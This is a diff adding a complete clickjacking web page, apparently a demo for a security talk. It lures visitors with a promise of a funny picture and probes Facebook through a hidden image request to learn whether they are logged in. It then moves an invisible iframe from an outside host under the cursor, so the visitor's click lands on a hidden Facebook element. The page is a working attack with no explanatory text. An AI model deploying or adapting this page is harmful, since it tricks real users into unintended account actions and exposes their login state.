@@ -1,0 +1,113 @@
+<html>
+	<head>
+		<style> 
+
+			html {
+				width: 100%;
+				height: 100%;
+			}
+
+			body{
+				cursor: hand;
+				margin: 0; 
+				padding: 0; 
+			}
+
+			#fblike {
+				border: 0px;
+				left: -14px;
+				top: -12px;
+				position: absolute;
+				filter: alpha(opacity=0);
+				z-index: 1;
+				opacity: 0;
+				overflow: hidden;
+				width: 922px;
+				height: 656px;
+			}
+
+			#clickme {
+				display:none;
+				overflow: hidden;
+				width: 1px;
+				height: 1px;
+				position: relative;
+			}
+
+			#winning, #loosing {
+				display: none;
+			}
+
+			img {
+			   position: absolute;
+			   top: 50%;
+			   left: 50%;
+			   width: 500px;
+			   margin-top: -250px; /* Half the height */
+			   margin-left: -250px; /* Half the width */
+			}
+		</style>
+	</head>
+	<body>
+		<div id="clickme">
+			<iframe id="fblike" name="fblike" src="https://talks.fletchto99.com/clickjacking/fb.html"> </iframe>
+		</div>
+		<div id="gimmick">
+			Click anywhere to load a funny picture :)
+		</div>
+		<img id="winning" src="1337.jpg"></img>
+		<img id="loosing" src="nofb.jpg"></img>
+		<script>
+			window.loggedIn = false;
+			window.clicked = false;
+
+			var d = document;
+			var toClick = d.getElementById("clickme");
+			var toLike = d.getElementById("fblike");
+			var gimmick = d.getElementById("gimmick");
+			var winning = d.getElementById("winning");
+			var loosing = d.getElementById("loosing");
+
+			if (!d.all) {
+				d.captureEvents(Event.MOUSEMOVE);
+				d.captureEvents(Event.MOUSECLICK);
+			}
+			
+			d.onmousemove = function(e){
+				if (!window.clicked) {
+					toClick.style.left = d.all ? event.clientX + d.body.scrollLeft : e.pageX;
+					toClick.style.top = d.all ? event.clientY + d.body.scrollTop : e.pageY;
+				}
+			};
+
+			d.onclick = function() {
+				if (!window.loggedIn && !window.clicked) {
+					window.clicked = true;
+					gimmick.style.display = "none";
+					loosing.style.display = "block";
+				}
+			};
+
+			window.onblur = function() {
+				if (window.loggedIn) {
+					setTimeout(function() {
+						window.clicked = true;
+						toClick.style.left = -100;
+						toClick.style.top = -100;
+					}, 300);
+					gimmick.style.display = "none";
+					winning.style.display = "block";
+					console.log("winning");
+				}
+			};
+			window.focus();
+		</script>
+		<img style="display:hidden;width:1px;height:1px;" 
+			src="https://www.facebook.com/login.php?next=https://www.facebook.com/favicon.ico"
+			onload="
+				window.loggedIn = true;
+				if (!window.clicked) { document.getElementById('clickme').style.display = 'block' };
+				console.log('logged into fb');" 
+			onerror="console.log('not logged into fb')">
+	</body>
+</html>
